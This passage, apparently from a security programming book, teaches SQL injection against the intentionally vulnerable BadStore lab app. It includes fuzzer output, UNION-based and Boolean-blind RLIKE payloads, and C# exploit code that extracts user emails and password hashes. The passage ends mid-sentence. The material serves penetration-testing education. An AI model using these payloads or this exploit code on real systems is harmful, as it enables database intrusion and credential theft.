</span><span class="calibre4"><span class="italic">unterminated</span></span></p><p class="calibre_6">The appearance of either error message could mean a SQL injection vulnerability exists within an application. If the response from an error returned contains either string, we return a value of <span class="calibre4">true</span> to the calling method, which means we think the application is vulnerable. Otherwise, we return <span class="calibre4">false</span>.</p><p id="filepos186228" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Testing the JSON Fuzzer</span></span></span></p><p class="calibre_11">Having completed the three methods required to fuzz the HTTP JSON request, we can test the Create User HTTP request, as shown in <a href="#filepos188282">Listing 2-26</a>.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">fuzzer.exe http://192.168.1.56/Vulnerable.ashx /Users/bperry/req_vulnjson</span></span><br class="calibre5"/><span class="calibre4">Fuzzing POST requests to URL http://192.168.1.13/Vulnerable.ashx</span><br class="calibre5"/><span class="calibre4">Fuzzing key: username</span><br class="calibre5"/><span class="calibre4">SQL injection vector: username</span><br class="calibre5"/><span class="calibre4">Fuzzing key: password</span><br class="calibre5"/><span class="calibre4">SQL injection vector: password</span><br class="calibre5"/><span class="calibre4">Fuzzing key: age➊</span><br class="calibre5"/><span class="calibre4">Converting int type to string to fuzz</span><br class="calibre5"/><span class="calibre4">SQL injection vector: age</span><br class="calibre5"/><span class="calibre4">Fuzzing key: line1</span><br class="calibre5"/><span class="calibre4">SQL injection vector: line1</span><br class="calibre5"/><span class="calibre4">Fuzzing key: line2</span><br class="calibre5"/><span class="calibre4">SQL injection vector: line2</span><br class="calibre5"/><span class="calibre4">Fuzzing key: city</span><br class="calibre5"/><span class="calibre4">SQL injection vector: city</span><br class="calibre5"/><span class="calibre4">Fuzzing key: state</span><br class="calibre5"/><span class="calibre4">SQL injection vector: state</span><br class="calibre5"/><span class="calibre4">Fuzzing key: zip➋</span><br class="calibre5"/><span class="calibre4">Converting int type to string to fuzz</span><br class="calibre5"/><span class="calibre4">SQL injection vector: zip</span><br class="calibre5"/><span class="calibre4">Fuzzing key: first</span><br class="calibre5"/><span class="calibre4">first does not seem vulnerable.</span><br class="calibre5"/><span class="calibre4">Fuzzing key: middle</span><br class="calibre5"/><span class="calibre4">middle does not seem vulnerable.</span><br class="calibre5"/><span class="calibre4">Fuzzing key: last</span><br class="calibre5"/><span class="calibre4">last does not seem vulnerable.</span><br class="calibre5"/><span class="calibre4"> Fuzzing key: method➌</span><br class="calibre5"/><span class="calibre4">method does not seem vulnerable.</span></blockquote><p id="filepos188282" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-26: The output from running the JSON fuzzer against the CsharpVulnJson application</span></span></p><p class="calibre_6">Running the fuzzer on the Create User request should show that most parameters are vulnerable to a SQL injection attack (the lines beginning with <span class="calibre4">SQL injection vector</span>), except for the <span class="calibre4">method</span> JSON key ➌ used by the web application to determine which operation to complete. Notice that even the <span class="calibre4">age</span> ➊ and <span class="calibre4">zip</span> ➋ parameters, originally integers in the JSON, are vulnerable if they are converted to a string when tested.</p><p id="filepos189005" class="calibre_10"><span class="calibre3"><span class="bold">Exploiting SQL Injections</span></span></p><p class="calibre_11">Finding possible SQL injections is only half the job of a penetration tester; exploiting them is the more important and more difficult half. Earlier in the chapter, we used a URL from BadStore to fuzz HTTP query string parameters, one of which was a vulnerable query string parameter called <span class="calibre4">searchquery</span> (refer back to <a href="#filepos147136">Listing 2-13</a> on <a href="#filepos114239">page 25</a>). The URL query string parameter <span class="calibre4">searchquery</span> is vulnerable to two types of SQL injection techniques. Both injection types (<span class="calibre4">boolean</span> based and <span class="calibre4">UNION</span> based) are incredibly useful to understand, so I’ll describe writing exploits for both types using the same vulnerable BadStore URL.</p><p class="calibre_6">The <span class="calibre4">UNION</span> technique is the easier one to use when exploiting SQL injections. It’s possible to use a <span class="calibre4">UNION</span> in <span class="calibre4">SELECT</span> query injections when you’re able to control the end of the SQL query. An attacker who can append a <span class="calibre4">UNION</span> statement to the end of a <span class="calibre4">SELECT</span> statement can return more rows of data to the web application than originally intended by the programmer.</p><p class="calibre_6">One of the trickiest parts of figuring out a <span class="calibre4">UNION</span> injection lies in balancing the columns. In essence, you must balance the same number of columns with the <span class="calibre4">UNION</span> clause as the original <span class="calibre4">SELECT</span> statement returns from the database. Another challenge lies in being able to programmatically tell where your injected results appear in the response from the web server.</p><p id="filepos190914" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Performing a UNION-Based Exploit by Hand</span></span></span></p><p class="calibre_11">Using <span class="calibre4">UNION</span>-based SQL injections is the fastest way to retrieve data from a database. In order to retrieve attacker-controlled data from the database with this technique, we must build a payload that retrieves the same number of columns as the original SQL query in the web application. Once we can balance the columns, we need to be able to programmatically find the data from the database in the HTTP response.</p><p class="calibre_6">When an attempt is made to balance the columns in a <span class="calibre4">UNION</span>-injectable SQL injection and the columns don’t balance, the error generally returned by the web application using MySQL is similar to that shown in <a href="#filepos191984">Listing 2-27</a>.</p><blockquote class="calibre_14"><span class="calibre4"> The used SELECT statements have a different number of columns...</span></blockquote><p id="filepos191984" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-27: Sample MySQL error when</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">SELECT</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">queries on the left and right of</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">UNION</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">aren’t balanced</span></span></p><p class="calibre_6">Let’s take the vulnerable line of code in the BadStore web application (<span class="calibre4">badstore.cgi</span>, line 203) and see how many columns it is selecting (see <a href="#filepos192786">Listing 2-28</a>).</p><blockquote class="calibre_14"><span class="calibre4">$sql="SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE '$squery' IN (itemnum,sdesc,ldesc)"; </span><a id="filepos192786"/><span class="calibre4"><span class="italic">Listing 2-28: Vulnerable line in the BadStore web application selecting four columns</span></span></blockquote><p class="calibre_6">Balancing <span class="calibre4">SELECT</span> statements takes a bit of testing, but I know from reading the source code of BadStore that this particular <span class="calibre4">SELECT</span> query returns four columns. When passing in the payload with spaces that are URL-encoded as plus signs, as shown in <a href="#filepos193534">Listing 2-29</a>, we find the word <span class="calibre4">hacked</span> returned as a row in the search results.</p><blockquote class="calibre_14"><span class="calibre4">searchquery=fdas'+UNION+ALL+SELECT+NULL, NULL, 'hacked', NULL%23</span></blockquote><p id="filepos193534" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-29: Properly balanced SQL injection that brings the word</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">hacked</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">back from the database</span></span></p><p class="calibre_6">When the <span class="calibre4">searchquery</span> value in this payload is passed to the application, the <span class="calibre4">searchquery</span> variable is used directly in the SQL query sent to the database, and we turn the original SQL query (<a href="#filepos192786">Listing 2-28</a>) into a new SQL query not intended by the original programmer, as shown in <a href="#filepos194479">Listing 2-30</a>.</p><blockquote class="calibre_14"><span class="calibre4">SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE 'fdas' UNION ALL SELECT</span><br class="calibre5"/><span class="calibre4">NULL, NULL, 'hacked', NULL➊# ' IN (itemnum,sdesc,ldesc) </span><a id="filepos194479"/><span class="calibre4"><span class="italic">Listing 2-30: Full SQL query with the payload appended that returns the word</span></span><span class="calibre4">
</span><span class="calibre7"><span class="italic">hacked</span></span></blockquote><p class="calibre_6">We use a hash mark ➊ to truncate the original SQL query, turning any SQL code following our payload into a comment that will not be run by MySQL. Now, any extra data (the word <span class="calibre4">hacked</span> in this case) that we want returned in the web server’s response should be in the third column of the <span class="calibre4">UNION</span>.</p><p class="calibre_6">Humans can determine fairly easily where the data returned by the payload shows up in the web page after exploitation. A computer, however, needs to be told where to look for any data brought back from a SQL injection exploit. It can be difficult to programmatically detect where the attacker-controlled data is in the server response. To make this easier, we can use the <span class="calibre4">CONCAT</span> SQL function to surround the data we actually care about with known markers, as in <a href="#filepos195801">Listing 2-31</a>.</p><blockquote class="calibre_14"><span class="calibre4">searchquery=fdsa'+UNION+ALL+SELECT+NULL, NULL, CONCAT(0x71766a7a71,'hacked',0x716b626b71), NULL#</span></blockquote><p id="filepos195801" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-31: Sample payload for the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">searchquery</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">parameter that returns the word</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">hacked</span></span></p><p class="calibre_6"> The payload in <a href="#filepos195801">Listing 2-31</a> uses hexadecimal values to add data to the left and right of the extra value <span class="calibre4">hacked</span> we select with our payload. If the payload is echoed back in the HTML from the web application, a regular expression won’t accidentally match the original payload. In this example, <span class="calibre4">0x71766a7a71</span> is <span class="italic">qvjzq</span> and <span class="calibre4">0x716b626b71</span> is <span class="italic">qkbkq.</span> If the injection works, the response should contain <span class="calibre4">qvjzqhackedqkbkq</span>. If the injection doesn’t work, and the search results are echoed back as is, a regular expression such as <span class="calibre4">qvjzq(.*)qkbkq</span> would not match the hexadecimal values in the original payload. The MySQL <span class="calibre4">CONCAT()</span> function is a handy way to ensure that our exploit will grab the correct data from the web server response.</p><p class="calibre_6"><a href="#filepos197468">Listing 2-32</a> shows a more useful example. Here, we can replace the <span class="calibre4">CONCAT()</span> function from the previous payload to return the current database, surrounded by the known left and right markers.</p><blockquote class="calibre_14"><span class="calibre4">CONCAT(0x7176627a71, DATABASE(), 0x71766b7671) </span><a id="filepos197468"/><span class="calibre4"><span class="italic">Listing 2-32: Sample payload that returns the current database name</span></span></blockquote><p class="calibre_6">The result of the injection on the BadStore search function should be <span class="calibre4">qvbzqbadstoredbqvkvq</span>. A regular expression such as <span class="calibre4">qvbzq(.*)qvkvq</span> should return the value of <span class="calibre4">badstoredb</span>, the name of the current database.</p><p class="calibre_6">Now that we know how to efficiently get the values out of the database, we can begin siphoning data out of the current database using the <span class="calibre4">UNION</span> injection. One particularly useful table in most web applications is the users table. As you can see in <a href="#filepos198750">Listing 2-33</a>, we can easily use the <span class="calibre4">UNION</span> injection technique described earlier to enumerate the users and their password hashes from the users table (called <span class="calibre4">userdb</span>) with a single request and payload.</p><blockquote class="calibre_14"><span class="calibre4">searchquery=fdas'+UNION+ALL+SELECT+NULL, NULL, CONCAT(0x716b717671, email,</span><br class="calibre5"/><span class="calibre4">0x776872786573, passwd,0x71767a7a71), NULL+FROM+badstoredb.userdb#</span></blockquote><p id="filepos198750" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-33: This payload pulls the emails and passwords from the BadStore database separated by left, middle, and right markers.</span></span></p><p class="calibre_6">The results should show up on the web page in the item table if the injection is successful.</p><p id="filepos199094" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Performing a UNION-Based Exploit Programmatically</span></span></span></p><p class="calibre_11">Now let’s look at how we can perform this exploit programmatically using some C# and the HTTP classes. By putting the payload shown in <a href="#filepos198750">Listing 2-33</a> in the <span class="calibre4">searchquery</span> parameter, we should see an item table in the web page with usernames and password hashes instead of any real items. All we need to do is make a single HTTP request and then use a regular expression to pull the emails and password hashes between the markers from the HTTP server’s response.</p><p class="calibre_10"><span class="calibre3"><span class="bold"> Creating the Markers to Find the Usernames and Passwords</span></span></p><p class="calibre_11">First, we need to create the markers for the regular expression, as shown in <a href="#filepos201007">Listing 2-34</a>. These markers will be used to delineate the values brought back from the database during the SQL injection. We want to use random-looking strings not likely to be found in the HTML source code so that our regular expression will only grab the usernames and password hashes we want from the HTML returned in the HTTP response.</p><blockquote class="calibre_14"><span class="calibre4">string frontMarker = ➊"FrOnTMaRker";</span><br class="calibre5"/><span class="calibre4">string middleMarker = ➋"mIdDlEMaRker";</span><br class="calibre5"/><span class="calibre4">string endMarker = ➌"eNdMaRker";</span><br class="calibre5"/><span class="calibre4">string frontHex = string.➍Join("", frontMarker.➎Select(c =&gt; ((int)c).ToString("X2")));</span><br class="calibre5"/><span class="calibre4">string middleHex = string.Join("", middleMarker.Select(c =&gt; ((int)c).ToString("X2")));</span><br class="calibre5"/><span class="calibre4">string endHex = string.Join("", endMarker.Select(c =&gt; ((int)c).ToString("X2"))); </span><a id="filepos201007"/><span class="calibre4"><span class="italic">Listing 2-34: Creating the markers to be used in the</span></span><span class="calibre4">
</span><span class="calibre7"><span class="italic">UNION</span></span><span class="calibre4"><span class="italic">-based SQL injection payload</span></span></blockquote><p class="calibre_6">To start things off, we create three strings to be used as the front ➊, middle ➋, and end ➌ markers. These will be used to find and separate the usernames and passwords we pulled from the database in the HTTP response. We also need to create the hexadecimal representations of the markers that will go in the payload. To do this, each marker needs to be processed a little bit.</p><p class="calibre_6">We use the LINQ method <span class="calibre4">Select()</span> ➎ to iterate over each character in the marker string, convert each character into its hexadecimal representation, and return an array of the data processed. In this case, it returns an array of 2-byte strings, each of which is the hexadecimal representation of a character in the original marker.</p><p class="calibre_6">In order to create a full hexadecimal string from this array, we use the <span class="calibre4">Join()</span> method ➍ to join each element in the array, creating a hexadecimal string representing each marker.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Building the URL with the Payload</span></span></p><p class="calibre_11">Now we need to build the URL and the payload to make the HTTP request, as shown in <a href="#filepos203227">Listing 2-35</a>.</p><blockquote class="calibre_14"><span class="calibre4">string url = ➊"http://" + ➋args[0] + "/cgi-bin/badstore.cgi";</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4">string payload = "fdsa' UNION ALL SELECT";</span><br class="calibre5"/><span class="calibre4">payload += " NULL, NULL, NULL, CONCAT(0x"+frontHex+", IFNULL(CAST(email AS";</span><br class="calibre5"/><span class="calibre4">payload += " CHAR), 0x20),0x"+middleHex+", IFNULL(CAST(passwd AS";</span><br class="calibre5"/><span class="calibre4">payload += " CHAR), 0x20), 0x"+endHex+") FROM badstoredb.userdb# ";</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4">url += ➌"?searchquery=" + Uri.➍EscapeUriString(payload) + "&amp;action=search"; </span><a id="filepos203227"/><span class="calibre4"><span class="italic">Listing 2-35: Building the URL with the payload in the</span></span><span class="calibre4">
</span><span class="calibre7"><span class="italic">Main()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method of the exploit</span></span></blockquote><p class="calibre_6"> We create the URL ➊ to make the request using the first argument ➋ passed to the exploit: an IP address of the BadStore instance. Once the base URL is created, we create the payload to be used to return the usernames and password hashes from the database, including the three hexadecimal strings we made of the markers to separate the usernames from the passwords. As stated earlier, we encode the markers in hexadecimal to ensure that, in case the markers are echoed back without the data we want, our regular expression won’t accidentally match them and return junk data. Finally, we combine the payload and the URL ➌ by appending the vulnerable query string parameters with the payload on the base URL. To ensure that the payload doesn’t contain any characters unique to the HTTP protocol, we pass the payload to <span class="calibre4">EscapeUriString()</span> ➍ before inserting it into the query string.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Making the HTTP Request</span></span></p><p class="calibre_11">We are now ready to make the request and receive the HTTP response containing the usernames and password hashes that were pulled from the database with the SQL injection payload (see <a href="#filepos205180">Listing 2-36</a>).</p><blockquote class="calibre_14"><span class="calibre4">HttpWebRequest request = (HttpWebRequest)WebRequest.➊Create(url);</span><br class="calibre5"/><span class="calibre4">string response = string.Empty;</span><br class="calibre5"/><span class="calibre4">using (StreamReader reader = ➋new StreamReader(request.GetResponse().GetResponseStream()))</span><br class="calibre5"/><span class="calibre4"> response = reader.➌ReadToEnd(); </span><a id="filepos205180"/><span class="calibre4"><span class="italic">Listing 2-36: Creating the HTTP request and reading the response from the server</span></span></blockquote><p class="calibre_6">We create a basic GET request by creating a new <span class="calibre4">HttpWebRequest</span> ➊ with the URL we built previously containing the SQL injection payload. We then declare a string to hold our response, assigning it an empty string by default. Within the context of a <span class="calibre4">using</span> statement, we instantiate a <span class="calibre4">StreamReader</span> ➋ and read the response ➌ into our <span class="calibre4">response</span> string. Now that we have the response from the server, we can create a regular expression using our markers to find the usernames and passwords within the HTTP response, as <a href="#filepos206637">Listing 2-37</a> shows.</p><blockquote class="calibre_14"><span class="calibre4"> Regex payloadRegex = ➊new Regex(frontMarker + "(.*?)" + middleMarker + "(.*?)" + endMarker);</span><br class="calibre5"/><span class="calibre4"> MatchCollection matches = payloadRegex.➋Matches(response);</span><br class="calibre5"/><span class="calibre4"> foreach (Match match in matches)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> Console.➌WriteLine("Username: " + match.➍Groups [1].Value + "\t ");</span><br class="calibre5"/><span class="calibre4"> Console.Write("Password hash: " + match.➎Groups[2].Value);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos206637" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-37: Matching the server response against the regular expression to pull out database values</span></span></p><p class="calibre_6">Here, we find and print the values retrieved with the SQL injection from the HTTP response. We first use the <span class="calibre4">Regex</span> class ➊ (in the namespace <span class="calibre4">System.Text.RegularExpressions</span>) to create a regular expression. This regular expression contains two <span class="italic">expression groups</span> that capture the username and password hash from a match, using the front, middle, and end markers defined previously. We then call the <span class="calibre4">Matches()</span> method ➋ on the regular expression, passing the response data as an argument to <span class="calibre4">Matches()</span>. The <span class="calibre4">Matches()</span> method returns a <span class="calibre4">MatchCollection</span> object, which we can iterate over using a <span class="calibre4">foreach</span> loop to retrieve each string in the response that matches the regular expression created earlier using our markers.</p><p class="calibre_6">As we iterate over each expression match, we print the username and password hash. Using the <span class="calibre4">WriteLine()</span> method ➌ to print the values, we build a string using the expression group captures for the usernames ➍ and the passwords ➎, which are stored the <span class="calibre4">Groups</span> property of the expression match.</p><p class="calibre_6">Running the exploit should result in the printout shown in <a href="#filepos208925">Listing 2-38</a>.</p><blockquote class="calibre_14"><span class="calibre4">Username: AAA_Test_User Password hash: 098F6BCD4621D373CADE4E832627B4F6</span><br class="calibre5"/><span class="calibre4">Username: admin Password hash: 5EBE2294ECD0E0F08EAB7690D2A6EE69</span><br class="calibre5"/><span class="calibre4">Username: joe@supplier.com Password hash: 62072d95acb588c7ee9d6fa0c6c85155</span><br class="calibre5"/><span class="calibre4">Username: big@spender.com Password hash: 9726255eec083aa56dc0449a21b33190</span><br class="calibre5"/><span class="calibre4">--</span><span class="calibre4"><span class="italic">snip</span></span><span class="calibre4">--</span><br class="calibre5"/><span class="calibre4">Username: tommy@customer.net Password hash: 7f43c1e438dc11a93d19616549d4b701</span></blockquote><p id="filepos208925" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-38: Sample output from the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">UNION-based exploit</span></span></p><p class="calibre_6">As you can see, with a single request we were able to extract all the usernames and password hashes from the <span class="calibre4">userdb</span> table in the BadStore MySQL database using a <span class="calibre4">UNION</span> SQL injection.</p><p id="filepos209379" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Exploiting Boolean-Blind SQL Vulnerabilities</span></span></span></p><p class="calibre_11">A <span class="italic">blind SQL injection</span>, also known as a <span class="italic">Boolean-based blind SQL injection</span>, is one in which an attacker doesn’t get direct information from a database but can extract information indirectly from the database, generally 1 byte at a time, by asking true-or-false questions.</p><p class="calibre_10"><span class="calibre3"><span class="bold">How Blind SQL Injections Work</span></span></p><p class="calibre_11">Blind SQL injections require a bit more code than <span class="calibre4">UNION</span> exploits in order to efficiently exploit a SQL injection vulnerability, and they take much more time to complete because so many HTTP requests are required. They are also far noisier on the server’s side than something like the <span class="calibre4">UNION</span> exploit and may leave much more evidence in logs.</p><p class="calibre_6">When performing a blind SQL injection, you get no direct feedback from the web application; you rely instead on metadata, such as behavior changes, in order to glean information from a database. For instance, by using the <span class="calibre4">RLIKE</span> MySQL keyword to match values in the database with a regular expression, as shown in <a href="#filepos210960">Listing 2-39</a>, we can cause an error to display in BadStore.</p><blockquote class="calibre_14"><span class="calibre4">searchquery=fdsa'+RLIKE+0x28+AND+'</span></blockquote><p id="filepos210960" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-39: Sample</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">RLIKE</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">blind SQL injection payload that causes an error in BadStore</span></span></p><p class="calibre_6"> When passed to BadStore, <span class="calibre4">RLIKE</span> will attempt to parse the hexadecimal-encoded string as a regular expression, causing an error (see <a href="#filepos212067">Listing 2-40</a>) because the string passed is a special character in regular expressions. The open parenthesis [ <span class="calibre4">(</span> ] character (0x28 in hexadecimal) denotes the beginning of an expression group, which we also used to match usernames and password hashes in the <span class="calibre4">UNION</span> exploit. The open parenthesis character must have a corresponding close parenthesis [ <span class="calibre4">)</span> ] character; otherwise, the syntax for the regular expression will be invalid.</p><blockquote class="calibre_14"><span class="calibre4">Got error 'parentheses not balanced' from regexp </span><a id="filepos212067"/><span class="calibre4"><span class="italic">Listing 2-40: Error from</span></span><span class="calibre4">
</span><span class="calibre7"><span class="italic">RLIKE</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">when an invalid regular expression is passed in</span></span></blockquote><p class="calibre_6">The parentheses are not balanced because a close parenthesis is missing. Now we know that we can reliably control the behavior of BadStore using true and false SQL queries to cause it to error.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Using RLIKE to Create True and False Responses</span></span></p><p class="calibre_11">We can use a <span class="calibre4">CASE</span> statement in MySQL (which behaves like a case statement in C-like languages) to deterministically select a good or bad regular expression for <span class="calibre4">RLIKE</span> to parse. For example, <a href="#filepos213169">Listing 2-41</a> returns a true response.</p><blockquote class="calibre_14"><span class="calibre4">searchquery=fdsa'+RLIKE+(SELECT+(CASE+WHEN+(1=1➊)+THEN+0x28+ELSE+0x41+END))+AND+'</span></blockquote><p id="filepos213169" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-41: An</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">RLIKE</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">blind payload that should return a true response</span></span></p><p class="calibre_6">The <span class="calibre4">CASE</span> statement first determines whether <span class="calibre4">1=1</span> ➊ is true. Because this equation is true, <span class="calibre4">0x28</span> is returned as the regular expression that <span class="calibre4">RLIKE</span> will try to parse, but because <span class="calibre4">(</span> is not a valid regular expression, an error should be thrown by the web application. If we manipulate the <span class="calibre4">CASE</span> criteria of <span class="calibre4">1=1</span> (which evaluates to true) to be <span class="calibre4">1=2</span>, the web application no longer throws an error. Because <span class="calibre4">1=2</span> evaluates to false, <span class="calibre4">0x41</span> (an uppercase <span class="italic">A</span> in hexadecimal) is returned to be parsed by <span class="calibre4">RLIKE</span> and does not cause a parsing error.</p><p class="calibre_6">By asking true-or-false questions (<span class="italic">does this equal that?</span>) of the web application, we can determine how it behaves and then, based on that behavior, determine whether the answer to our question was true or false.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Using the RLIKE Keyword to Match Search Criteria</span></span></p><p class="calibre_11">The payload in <a href="#filepos215187">Listing 2-42</a> for the <span class="calibre4">searchquery</span> parameter should return a true response (an error) because the length of the number of rows in the <span class="calibre4">userdb</span> table is greater than 1.</p><blockquote class="calibre_14"><span class="calibre4">searchquery=fdsa'+RLIKE+(SELECT+(CASE+WHEN+((SELECT+LENGTH(IFNULL(CAST(COUNT(*)</span><br class="calibre5"/><span class="calibre4">+AS+CHAR),0x20))+FROM+userdb)=1➊)+THEN+0x41+ELSE+0x28+END))+AND+'</span></blockquote><p id="filepos215187" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-42: Sample Boolean-based SQL injection payload for the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">searchquery</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">parameter</span></span></p><p class="calibre_6"> Using the <span class="calibre4">RLIKE</span> and <span class="calibre4">CASE</span> statements, we check whether the length of the count of the BadStore <span class="calibre4">userdb</span> is equal to 1. The <span class="calibre4">COUNT(*)</span> statement returns an integer, which is the number of rows in a table. We can use this number to significantly reduce the number of requests needed to finish an attack.</p><p class="calibre_6">If we modify the payload to determine whether the length of the number of rows is equal to 2 instead of 1 ➊, the server should return a true response that contains an error that says “parentheses not balanced.” For example, say BadStore has 999 users in the <span class="calibre4">userdb</span> table. Although you might expect that we’d need to send at least 1,000 requests to determine whether the number returned by <span class="calibre4">COUNT(*)</span> was greater than 999, we can brute-force each individual digit (each instance of 9) much faster than we could the whole number (999). The length of the number 999 is three, since 999 is three characters long. If, instead of brute-forcing the whole number 999, we brute-force the first, second, and then third digits individually, we would have the whole number 999 brute-forced in just 30 requests—up to 10 requests per single number.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Determining and Printing the Number of Rows in the userdb Table</span></span></p><p class="calibre_11">To make this a bit more clear, let’s write a <span class="calibre4">Main()</span> method to determine how many rows are contained in the <span class="calibre4">userdb</span> table. With the <span class="calibre4">for</span> loop shown in <a href="#filepos218157">Listing 2-43</a>, we determine the length of the number of rows contained in the <span class="calibre4">userdb</span> table.</p><blockquote class="calibre_14"><span class="calibre4">int countLength = 1;</span><br class="calibre5"/><span class="calibre4">for (;;countLength++)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT";</span><br class="calibre5"/><span class="calibre4"> getCountLength += " LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM";</span><br class="calibre5"/><span class="calibre4"> getCountLength += " userdb)="+countLength+") THEN 0x28 ELSE 0x41 END))";</span><br class="calibre5"/><span class="calibre4"> getCountLength += " AND 'LeSo'='LeSo";</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> string response = MakeRequest(getCountLength);</span><br class="calibre5"/><span class="calibre4"> if (response.Contains("parentheses not balanced"))</span><br class="calibre5"/><span class="calibre4"> break;</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos218157" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-43: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">for</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">loop retrieving the length of the database count of the user database</span></span></p><p class="calibre_6">We begin with a <span class="calibre4">countLength</span> of zero and then increment <span class="calibre4">countLength</span> by 1 each time through the loop, checking whether the response to the request contains the true string <span class="calibre4">"parentheses not balanced"</span>. If so, we break out of the <span class="calibre4">for</span> loop with the correct <span class="calibre4">countLength</span>, which should be 23.</p><p class="calibre_6">Then we ask the server for the number of rows contained in the <span class="calibre4">userdb</span> table, as shown in <a href="#filepos220108">Listing 2-44</a>.</p><blockquote class="calibre_14"><span class="calibre4">List&lt;byte&gt; countBytes = new List&lt;byte&gt;();</span><br class="calibre5"/><span class="calibre4">for (int i = 1; i &lt;= countLength; i++)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> for (int c = 48; c &lt;= 58; c++)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> string getCount = "fdsa' RLIKE (SELECT (CASE WHEN (➊ORD(➋MID((SELECT";</span><br class="calibre5"/><span class="calibre4"> getCount += " IFNULL(CAST(COUNT(*) AS CHAR), 0x20) FROM userdb)➌,";</span><br class="calibre5"/><span class="calibre4"> getCount += i➍+ ", 1➎))="+c➏+") THEN 0x28 ELSE 0x41 END)) AND '";</span><br class="calibre5"/><span class="calibre4"> string response = MakeRequest (getCount);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (response.➐Contains("parentheses not balanced"))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> countBytes.➑Add((byte)c);</span><br class="calibre5"/><span class="calibre4"> break;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos220108" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-44: Retrieving the number of rows in the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">userdb</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">table</span></span></p><p class="calibre_6">The SQL payload used in <a href="#filepos220108">Listing 2-44</a> is a bit different from the previous SQL payloads used to retrieve the count. We use the <span class="calibre4">ORD()</span> ➊ and <span class="calibre4">MID()</span> ➋ SQL functions.</p><p class="calibre_6">The <span class="calibre4">ORD()</span> function converts a given input into an integer, and the <span class="calibre4">MID()</span> function returns a particular substring, based on a starting index and length to return. By using both functions, we can select one character at a time from a string returned by a <span class="calibre4">SELECT</span> statement and convert it to an integer. This allows us to compare the integer representation of the byte in the string to to the character value we are testing for in the current interation.</p><p class="calibre_6">The <span class="calibre4">MID()</span> function takes three arguments: the string you are selecting a substring from ➌; the starting index (which is 1 based, not 0 based, as you might expect) ➍; and the length of the substring to select ➎. Notice that the second argument ➍ to <span class="calibre4">MID()</span> is dictated by the current iteration of the outermost <span class="calibre4">for</span> loop, where we increment <span class="calibre4">i</span> up to the count length determined in the previous <span class="calibre4">for</span> loop. This argument selects the next character in the string to test as we iterate and increment it. The inner <span class="calibre4">for</span> loop iterates over the integer equivalents of the ASCII characters 0 through 9. Because we’re only attempting to get the row count in the database, we only care about numerical characters.</p><p class="calibre_6">Both the <span class="calibre4">i</span> ➍ and <span class="calibre4">c</span> ➏ variables are used in the SQL payload during the Boolean injection attack. The variable <span class="calibre4">i</span> is used as the second argument in the <span class="calibre4">MID()</span> function, dictating the character position in the database value we will test. The variable <span class="calibre4">c</span> is the integer we are comparing the result of <span class="calibre4">ORD()</span> to, which converts the character returned by <span class="calibre4">MID()</span> to an integer. This allows us to iterate over each character in a given value in the database and brute-force the character using true-or-false questions.</p><p class="calibre_6">When the payload returns the error <span class="calibre4">"parentheses not balanced"</span> ➐, we know that the character at index <span 